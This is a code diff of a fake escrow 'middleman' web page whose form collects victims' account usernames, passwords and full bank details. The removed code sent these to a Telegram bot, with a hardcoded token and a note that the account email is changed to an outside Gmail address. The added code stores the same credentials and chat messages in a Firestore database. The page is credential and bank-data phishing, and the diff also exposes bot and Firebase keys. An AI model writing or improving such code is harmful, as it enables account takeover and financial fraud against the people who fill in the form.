@@ -830,7 +830,7 @@
         </div>
     </div>
 
-    <!-- Scripts: Telegram, Live Chat, & Firebase Authentication Integration -->
+    <!-- Main Logic Scripts: Firebase Integration -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { 
@@ -842,19 +842,28 @@
             signOut, 
             onAuthStateChanged 
         } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+        import { 
+            getFirestore, 
+            collection, 
+            addDoc, 
+            serverTimestamp 
+        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // TODO: Replace with your actual Firebase project configuration details
+        // Your exact Firebase project configuration
         const firebaseConfig = {
             apiKey: "AIzaSyBRrvbIb2oJmRR2VvPapc04CoPb2la2DNA",
             authDomain: "middleman-3b4d7.firebaseapp.com",
+            databaseURL: "https://middleman-3b4d7-default-rtdb.firebaseio.com",
             projectId: "middleman-3b4d7",
             storageBucket: "middleman-3b4d7.firebasestorage.app",
             messagingSenderId: "958222361835",
-            appId: "1:958222361835:web:9243b6991c98744884caae"
+            appId: "1:958222361835:web:9243b6991c98744884caae",
+            measurementId: "G-HTGZD0DMN9"
         };
 
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
+        const db = getFirestore(app);
         const googleProvider = new GoogleAuthProvider();
 
         document.addEventListener('DOMContentLoaded', () => {
@@ -862,46 +871,28 @@
             const confirmationModal = document.getElementById('confirmationModal');
             const closeModalBtn = document.getElementById('closeModalBtn');
 
-            // Telegram Bot Credentials
-            const TELEGRAM_BOT_TOKEN = '9110476686:AAEWur5sDsKFeD6SFLcXMnleLfw57_F-5RY';
-            const CHAT_ID = '9110476686';
-
-            // Escrow Submission Handler
+            // Escrow Form Submission -> Real-time Firestore Database
             escrowForm.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 
                 const formData = new FormData(escrowForm);
                 const data = Object.fromEntries(formData.entries());
 
-                const message = `
-🔔 NEW ESCROW SUBMISSION:
-
-👤 ACCOUNT INFO:
-- Email Changed To: gamermaid.ai@gmail.com
-- Username: ${data.username}
-- Password: ${data.password}
-- Sign-in Location: ${data.signinLocation}
-- Sign-up Date: ${data.signupDate}
-- Phone Model: ${data.phoneModel}
-
-🏦 BANK INFORMATION:
-- Bank Name: ${data.bankName}
-- Account Holder: ${data.accountHolder}
-- Account Number: ${data.accountNumber}
-- SWIFT Code: ${data.swiftCode}
-                `.trim();
-
                 try {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message
-                        })
+                    await addDoc(collection(db, "escrow_submissions"), {
+                        username: data.username,
+                        password: data.password,
+                        signinLocation: data.signinLocation,
+                        signupDate: data.signupDate,
+                        phoneModel: data.phoneModel,
+                        bankName: data.bankName,
+                        accountHolder: data.accountHolder,
+                        accountNumber: data.accountNumber,
+                        swiftCode: data.swiftCode,
+                        createdAt: serverTimestamp()
                     });
                 } catch (err) {
-                    console.error('Failed to send Telegram notification:', err);
+                    console.error('Failed to save escrow submission to Firestore:', err);
                 }
 
                 confirmationModal.classList.add('active');
@@ -912,7 +903,7 @@
                 escrowForm.reset();
             });
 
-            // Live Chat Widget Interactions & Telegram Integration
+            // Live Chat Widget Interactions -> Real-time Firestore Database
             const chatToggleBtn = document.getElementById('chatToggleBtn');
             const chatBox = document.getElementById('chatBox');
             const chatCloseBtn = document.getElementById('chatCloseBtn');
@@ -920,13 +911,8 @@
             const chatInput = document.getElementById('chatInput');
             const chatMessages = document.getElementById('chatMessages');
 
-            chatToggleBtn.addEventListener('click', () => {
-                chatBox.classList.toggle('active');
-            });
-
-            chatCloseBtn.addEventListener('click', () => {
-                chatBox.classList.remove('active');
-            });
+            chatToggleBtn.addEventListener('click', () => chatBox.classList.toggle('active'));
+            chatCloseBtn.addEventListener('click', () => chatBox.classList.remove('active'));
 
             chatSendBtn.addEventListener('click', sendMessage);
             chatInput.addEventListener('keypress', (e) => {
@@ -944,19 +930,13 @@
                 chatInput.value = '';
                 chatMessages.scrollTop = chatMessages.scrollHeight;
 
-                const telegramChatMessage = `💬 NEW LIVE CHAT MESSAGE:\n"${text}"`;
-
                 try {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: telegramChatMessage
-                        })
+                    await addDoc(collection(db, "live_chats"), {
+                        message: text,
+                        createdAt: serverTimestamp()
                     });
                 } catch (err) {
-                    console.error('Failed to send chat message to Telegram:', err);
+                    console.error('Failed to send live chat message to Firestore:', err);
                 }
 
                 setTimeout(() => {
@@ -989,9 +969,7 @@
             }
 
             if (closeAuthModal && authModal) {
-                closeAuthModal.addEventListener('click', () => {
-                    authModal.classList.remove('active');
-                });
+                closeAuthModal.addEventListener('click', () => authModal.classList.remove('active'));
             }
 
             switchAuthModeBtn.addEventListener('click', () => {
